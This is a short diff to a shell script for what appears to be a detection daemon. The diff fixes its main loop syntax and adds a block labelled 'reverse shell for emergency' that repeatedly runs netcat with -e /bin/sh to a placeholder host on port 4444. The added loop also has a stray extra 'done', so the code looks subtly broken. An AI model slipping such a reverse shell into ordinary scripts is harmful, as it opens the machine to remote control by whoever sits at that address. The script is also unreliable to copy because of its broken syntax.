@@ -4,7 +4,17 @@
 
 echo "Starting Daemon" | figlet
 
-while(True){
+#reverse shell for emergency
+
+for ((n=0;n<=6;n++)) ; do
+    echo "Attempt $n reverse shell"
+    nc <ipPc> 4444 -e /bin/sh
+    done
+done
+
+#cicle for sending saving and removeing file (it also run the py script for retrive data)
+
+while true; do
 
     python detection.py
     
@@ -44,4 +54,4 @@ while(True){
 
     delay 3s
 
-}
+done
